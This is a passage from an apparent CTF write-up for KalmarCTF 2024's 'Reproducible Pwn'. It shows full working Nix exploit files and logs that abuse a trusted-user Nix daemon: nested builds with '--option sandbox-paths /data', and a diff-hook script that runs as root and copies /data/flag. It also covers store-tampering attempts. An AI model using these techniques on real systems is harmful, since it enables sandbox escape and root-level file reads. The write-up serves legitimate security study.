+</span><span>  </span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">}</span><span>.</span><span style="color:#bb80b3;">exploit-inner </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit-inner</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>      </span><span style="color:#5f6364;"># Just run installPhase and skip everything else
+</span><span>      </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">        mkdir $out
+</span><span style="color:#99c794;">        cat /data/flag
+</span><span style="color:#99c794;">        cp /data/flag $out
+</span><span style="color:#99c794;">      </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>This flake gets the flag from <code>/data/flag</code> and places it in the derivation
+output. It also prints it to stdout, which should allow us to get the
+flag as well if it works.</p>
+<p>As we are now a trusted user, we are able to pass certain options to the daemon,
+one of which is <code>sandbox-paths</code>, which allows us to specify which paths
+will be exposed inside a sandbox.
+With this in mind, we simply build this inner flake from inside the other one
+we already had by changing the <code>installPhase</code>:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">}</span><span>.</span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#5f6364;"># ...
+</span><span>    </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">      # Use the exposed socket inside the sandbox
+</span><span style="color:#99c794;">      export NIX_REMOTE=unix:///tmp/daemon
+</span><span style="color:#99c794;">      # Build the flake
+</span><span style="color:#99c794;">      nix --extra-experimental-features &quot;nix-command flakes&quot; \
+</span><span style="color:#99c794;">        build \
+</span><span style="color:#99c794;">        $src#exploit-inner \
+</span><span style="color:#99c794;">        --option sandbox-paths /data
+</span><span style="color:#99c794;">
+</span><span style="color:#99c794;">      # Copy flag to output
+</span><span style="color:#99c794;">      mkdir $out
+</span><span style="color:#99c794;">      cp result/flag $out
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>As a result, we end up with the following file structure:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>.
+</span><span>├── flake.lock
+</span><span>├── flake.nix
+</span><span>└── src
+</span><span>   ├── flake.lock
+</span><span>   └── flake.nix
+</span></code></pre>
+<p>I had high hopes for this strategy, but upon copying the files to the VM
+and building the flake, I got the following error message.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ nix build .#exploit
+</span><span>warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>error: builder for &#39;/nix/store/czdlf1flmdqh2xhj0rl80s62x4dkh65l-exploit.drv&#39; failed with exit code 1;
+</span><span>       last 3 log lines:
+</span><span>       &gt; Running phase: installPhase
+</span><span>       &gt; warning: you don&#39;t have Internet access; disabling some network-dependent features
+</span><mark style="background-color:#3e4044;"><span>       &gt; error: getting status of &#39;/nix/store/09r5picm4ibj3dbb51jsmfdplf6j9z6y-source&#39;: No such file or directory
+</span></mark><span>       For full logs, run &#39;nix log /nix/store/czdlf1flmdqh2xhj0rl80s62x4dkh65l-exploit.drv&#39;.
+</span></code></pre>
+<p>It appears that the flake is copied to the nix store (the folder does indeed exist
+outside the sandbox), but the sandbox does not allow the builder to access it,
+so we get this error.</p>
+<p>At this point I gave up trying to get the derivation build to work and started looking
+into the second attack vector, modifying the Nix store.
+Little did I know how close I was…</p>
+<h3 id="modifying-the-nix-store">Modifying the Nix Store</h3>
+<p>As mentioned previously, my goal for modifying the Nix store was to change the
+configuration of the <code>nix-daemon</code>, more specifically the file that contained
+the <code>extra-sandbox-paths</code> configuration:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[root@nixos:~]# cat /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span><span>extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
+</span></code></pre>
+<p>If I could change that file to include the <code>/data</code> directory in the sandbox,
+I would be able to get the flag from inside the derivation,
+and according to the previously mentioned GitHub issue, this is possible.</p>
+<p>Unfortunately, after spending way too long trying to figure out a way to
+overwrite files in the store, I did not get anywhere, even though there is
+likely something that I missed.</p>
+<p>As I already had this file in the Nix store of my own laptop from
+building the ISO, I tried to somehow tamper with it.
+Sadly, my experiments were fairly limited since I am not very knowledgable with
+the commands used to interact with the store.
+As a result, my plan for tampering this would be to copy the file to
+a temporary Nix store, modify it, and copy it back.</p>
+<p>To achieve this, I firstly created a new directory <code>/tmp/store</code> and
+used <code>nix copy</code> to populate the store with our target file:</p>
+<pre data-lang="sh" style="background-color:#2b2c2f;color:#cccece;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#6699cc;">nix copy</span><span style="color:#5fb3b3;"> --</span><span style="color:#f99157;">to</span><span style="color:#6699cc;"> /tmp/store</span><span style="color:#5fb3b3;"> --</span><span style="color:#f99157;">no-check-sigs</span><span style="color:#6699cc;"> /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span></code></pre>
+<p>This works as intended, which means I went ahead and edited the file, taking
+care to add write permissions beforehand and removing them afterwards:</p>
+<pre data-lang="sh" style="background-color:#2b2c2f;color:#cccece;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#6699cc;">cd /tmp/store/nix/store
+</span><span style="color:#6699cc;">chmod +w y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span><span style="color:#6699cc;">echo </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">extra-sandbox-paths = /data</span><span style="color:#5fb3b3;">&quot; &gt;</span><span style="color:#6699cc;"> y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span><span style="color:#6699cc;">chmod</span><span style="color:#5fb3b3;"> -</span><span style="color:#f99157;">w</span><span style="color:#6699cc;"> y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span></code></pre>
+<p>Finally, I (tried to) copy it back to my own store:</p>
+<pre data-lang="sh" style="background-color:#2b2c2f;color:#cccece;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#6699cc;">nix copy</span><span style="color:#5fb3b3;"> --</span><span style="color:#f99157;">from</span><span style="color:#6699cc;"> /tmp/store</span><span style="color:#5fb3b3;"> --</span><span style="color:#f99157;">no-check-sigs</span><span style="color:#6699cc;"> /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span></code></pre>
+<p>The command did not output anything, but checking the file in the store reveals
+that it has not been changed:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>❯ cat /nix/store/y1agqpp139p4czw684vm8nnsmj02w5jl-nix-daemon-config
+</span><span>
+</span><span>extra-sandbox-paths = /tmp/daemon=/nix/var/nix/daemon-socket/socket
+</span></code></pre>
+<p>Running the <code>nix copy</code> command with <code>-vv</code> reveals that 0 files were copied, presumably
+because it already exists in the destination.
+I tried a few flags such as <code>--repair</code> and <code>--refresh</code>, but none of them helped.</p>
+<p>After some rubber duck debugging with my teammates, I decided to abandon this
+effort and go back to exploring the idea of building a derivation inside a derivation,
+but this time without using flakes.</p>
+<h3 id="building-a-package-inside-a-derivation">Building a Package inside a Derivation</h3>
+<p>This ended up being pretty similar to my previous attempt, since the only
+difference is the lack of flakes, which meant I had to go back and
+remembered how to <em>not</em> use flakes.
+After some time searching, I ended up with the following nix file:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#c594c5;">let
+</span><span>  </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#99c794;">&lt;nixpkgs&gt; </span><span style="color:#5fb3b3;">{};
+</span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">exploit-inner </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit-inner</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">      mkdir $out
+</span><span style="color:#99c794;">      cat /data/flag
+</span><span style="color:#99c794;">      cp /data/flag $out
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>It is now possible to build this from the outer flake,
+while making sure to pass it the path to <code>nixpkgs</code>, which
+cannot otherwise be found by <code>nix-build</code>:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">}</span><span>.</span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#5f6364;"># ...
+</span><span>    </span><span style="color:#bb80b3;">src </span><span style="color:#5fb3b3;">= </span><span style="color:#99c794;">./inner.nix</span><span style="color:#5fb3b3;">;
+</span><span>    </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">      export NIX_REMOTE=unix:///tmp/daemon
+</span><span style="color:#99c794;">      cp $src default.nix
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">      nix-build -A exploit-inner \
+</span></mark><mark style="background-color:#3e4044;"><span style="color:#99c794;">        -I nixpkgs=</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;"> \
+</span></mark><mark style="background-color:#3e4044;"><span style="color:#99c794;">        --option sandbox-paths /data
+</span></mark><span style="color:#99c794;">      mkdir $out
+</span><span style="color:#99c794;">      cp result/flag $out
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Copying these files to the VM and building the derivation gives
+us the flag! 🎉</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ nix build .#exploit
+</span><span>warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>error: builder for &#39;/nix/store/sz3117jmlliqvnsd3f7g3vnigfa97x2r-exploit.drv&#39; failed with exit code 1;
+</span><span>       last 10 log lines:
+</span><span>       &gt; warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>       &gt; warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>       &gt; warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>       &gt; warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>       &gt; warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>       &gt; building &#39;/nix/store/rbyna569136fcxdd8g38vmg2dwkjb4a6-exploit-inner.drv&#39;...
+</span><span>       &gt; Running phase: installPhase
+</span><mark style="background-color:#3e4044;"><span>       &gt; kalmar{faker_flag}
+</span></mark><span>       &gt; /nix/store/34arwa2ixqh46sc9v3gksgiglxpmzfll-exploit-inner
+</span><span>       &gt; cp: cannot stat &#39;result/flag&#39;: No such file or directory
+</span><span>       For full logs, run &#39;nix log /nix/store/sz3117jmlliqvnsd3f7g3vnigfa97x2r-exploit.drv&#39;.
+</span></code></pre>
+<p>I was still not happy since I wanted to have the flag be placed in the output
+of the derivation, but it appears there’s an error related to copying it to the
+output folder.
+Turns out this is the same problem as I was facing with the flake: the path the
+<code>result</code> symlink points to (<code>/nix/store/34arwa2ixqh46sc9v3gksgiglxpmzfll-exploit-inner</code>)
+exists, but it is inaccessible from inside the sandbox.
+This can be quickly fixed by copying the symlink itself to the output folder,
+taking care to pass the <code>--no-dereference</code> to <code>cp</code> to preserve the symlink
+(i.e., <code>cp --no-dereference result $out</code>).</p>
+<p>As a result, the exploit can be reduced to simply two files and two commands:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>.
+</span><span>├── flake.nix
+</span><span>└── inner.nix
+</span></code></pre>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ nix build .#exploit
+</span><span>warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>
+</span><span>[user@nixos:~]$ cat result/result/flag
+</span><span>kalmar{faker_flag}
+</span></code></pre>
+<p>Beautiful.</p>
+<details>
+<summary>Full exploit files</summary>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># flake.nix
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">description </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">Exploit for Reproducible Pwn - KalmarCTF 2024</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">inputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#bb80b3;">nixpkgs</span><span>.</span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">github:nixos/nixpkgs?ref=6e2f00c83911461438301db0dba5281197fe4b3a</span><span style="color:#5fb3b3;">&quot;; </span><span style="color:#5f6364;"># nixos-unstable
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">outputs </span><span style="color:#5fb3b3;">= {
+</span><span>    </span><span style="color:#f99157;">self</span><span style="color:#5fb3b3;">,
+</span><span>    </span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">,
+</span><span>  </span><span style="color:#5fb3b3;">}: </span><span style="color:#c594c5;">let
+</span><span>    </span><span style="color:#bb80b3;">system </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">x86_64-linux</span><span style="color:#5fb3b3;">&quot;;
+</span><span>    </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nixpkgs </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#c594c5;">inherit </span><span style="color:#bb80b3;">system</span><span style="color:#5fb3b3;">;
+</span><span>      </span><span style="color:#bb80b3;">overlays </span><span style="color:#5fb3b3;">= [
+</span><span>        </span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">: </span><span style="color:#f99157;">prev</span><span style="color:#5fb3b3;">: {
+</span><span>          </span><span style="color:#bb80b3;">nix </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">final</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nixVersions</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nix_2_13</span><span style="color:#5fb3b3;">;
+</span><span>        </span><span style="color:#5fb3b3;">})
+</span><span>      </span><span style="color:#5fb3b3;">];
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">}</span><span>.</span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">src </span><span style="color:#5fb3b3;">= </span><span style="color:#99c794;">./inner.nix</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">buildInputs </span><span style="color:#5fb3b3;">= [
+</span><span>        </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">nix
+</span><span>      </span><span style="color:#5fb3b3;">];
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>      </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">        export NIX_REMOTE=unix:///tmp/daemon
+</span><span style="color:#99c794;">        cp $src default.nix
+</span><span style="color:#99c794;">        nix-build -A exploit-inner -I nixpkgs=</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;"> --option sandbox-paths /data
+</span><span style="color:#99c794;">        mkdir $out
+</span><span style="color:#99c794;">        cp --no-dereference result $out
+</span><span style="color:#99c794;">      </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># inner.nix
+</span><span style="color:#c594c5;">let
+</span><span>  </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#99c794;">&lt;nixpkgs&gt; </span><span style="color:#5fb3b3;">{};
+</span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">exploit-inner </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit-inner</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">      mkdir $out
+</span><span style="color:#99c794;">      cat /data/flag
+</span><span style="color:#99c794;">      cp /data/flag $out
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+</details>
+<h2 id="intended-solution">Intended Solution</h2>
+<p>After talking with the challenge author, <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@nrab">niko</a>, I was made aware
+that there were two intended solutions, and neither of them included the use
+of <code>sandbox-paths</code> (or disabling the sandbox completely).
+The first one (and easiest) was to instead use <code>diff-hook</code> to run code as root
+in a similar fashion to the forbidden <code>post-build-hook</code>.
+The second one was to leverage read-write access to the Nix store as root to edit
+some critical files in the system, similarly to what I tried to (unsuccessfully)
+achieve.</p>
+<p>Let’s take a look at both of them and how they could be used.</p>
+<h3 id="abusing-diff-hook">Abusing diff-hook</h3>
+<p>After taking a look at the <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/blob/2.13.6/doc/manual/src/advanced-topics/diff-hook.md">manual for <code>diff-hook</code></a>,
+it looks like the “diff hook is executed by the same user and group who
+ran the build”, which in our case means the root user.
+Additionally, it appears that this hook is not run inside the sandbox,
+which means it has access to the flag.</p>
+<p>This <code>diff-hook</code> is executed when the output of the same derivation differs
+from a previous build, with the goal of calculating the differences
+between the two builds (hence the name).
+Therefore, to take advantage of <code>diff-hook</code>, we need to build an unstable
+derivation, that is, a derivation that doesn’t always produce the same output.
+An easy way to achieve this is to read from <code>/dev/random</code> and write it
+to the derivation output, as such:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">exploit-inner </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">name </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">exploit-inner</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">phases </span><span style="color:#5fb3b3;">= [&quot;</span><span style="color:#99c794;">installPhase</span><span style="color:#5fb3b3;">&quot;];
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">      mkdir $out
+</span><span style="color:#99c794;">      # Write 16 random bytes to $out/data
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">      dd if=/dev/urandom of=$out/data bs=16 count=1
+</span></mark><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>With our unstable derivation at hand, we can now build it twice,
+making sure to tell Nix to rebuild the derivation a second time
+with the <code>diff-hook</code> and to check it against the previous build
+with the <code>--check</code> option, otherwise it would just realise it had
+already been built and do nothing.</p>
+<p>Our specially crafted <code>diff-hook</code> simply copies the flag, which
+it has access to, to a different file that is readable by the
+non-root user.</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">} = </span><span style="color:#c594c5;">rec </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#5f6364;"># ...
+</span><span>      </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">        export NIX_REMOTE=unix:///tmp/daemon
+</span><span style="color:#99c794;">        cp $src default.nix
+</span><span style="color:#99c794;">        nix-build -A exploit-inner \
+</span><span style="color:#99c794;">          -I nixpkgs=</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">}
+</span><span style="color:#99c794;">        nix-build -A exploit-inner \
+</span><span style="color:#99c794;">          -I nixpkgs=</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">nixpkgs</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;"> \
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">          --option diff-hook </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">diffHook</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;"> \
+</span></mark><mark style="background-color:#3e4044;"><span style="color:#99c794;">          --option run-diff-hook true \
+</span></mark><mark style="background-color:#3e4044;"><span style="color:#99c794;">          --check
+</span></mark><span style="color:#99c794;">      </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>    </span><span style="color:#bb80b3;">diffHook </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeScript </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">diff-hook</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">      cat /data/flag &gt; /tmp/flag
+</span></mark><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>As expected, building the derivation copies the flag to <code>/tmp/flag</code>:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ nix build .#exploit
+</span><span>warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>error: builder for &#39;/nix/store/5d6hd01q1pv41r8025b9q8pbhyqj1fvn-exploit.drv&#39; failed with exit code 1;
+</span><span>       last 8 log lines:
+</span><span>       &gt; Running phase: installPhase
+</span><span>       &gt; /nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner
+</span><span>       &gt; checking outputs of &#39;/nix/store/9z1sjss8m2scwws4d7wwwjzis3hgg8xi-exploit-inner.drv&#39;...
+</span><span>       &gt; Running phase: installPhase
+</span><span>       &gt; 1+0 records in
+</span><span>       &gt; 1+0 records out
+</span><span>       &gt; 16 bytes copied, 0.000148997 s, 107 kB/s
+</span><span>       &gt; error: derivation &#39;/nix/store/9z1sjss8m2scwws4d7wwwjzis3hgg8xi-exploit-inner.drv&#39; may not be deterministic: output &#39;/nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner&#39; differs from &#39;/nix/store/xi6d4pi139cxvmx0hmv46m6gr4wvxzg8-exploit-inner.check&#39;
+</span><span>       For full logs, run &#39;nix log /nix/store/5d6hd01q1pv41r8025b9q8pbhyqj1fvn-exploit.drv&#39;.
+</span><span>
+</span><span>[user@nixos:~]$ cat /tmp/flag
+</span><mark style="background-color:#3e4044;"><span>kalmar{faker_flag}
